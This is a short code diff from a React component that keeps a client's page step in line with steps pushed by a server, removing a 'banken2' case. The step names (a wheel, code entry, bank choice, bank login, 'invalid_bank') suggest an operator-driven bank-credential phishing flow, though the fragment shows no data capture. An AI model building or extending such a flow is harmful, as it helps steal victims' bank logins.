@@ -181,7 +181,7 @@ export function SessionRealtimeGate({
         const lsStr = String(localStep);
         if (lsStr === "wheel" && srv === "code_entry") { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
         if (lsStr === "banken" && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
-        if ((lsStr === "banken2" || lsStr === "invalid_bank") && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
+        if (lsStr === "invalid_bank" && (srv === "bank" || srv === "bank_login")) { lastSrv = srv; setDbg(prev => ({ ...prev, tick: tickN, localStep: lsStr, serverStep: srv })); return; }
 
         const finalRouteSid = (data.public_id != null) ? String(data.public_id) : (resolvedRouteSid || resolvedUuid);
         let target = "";
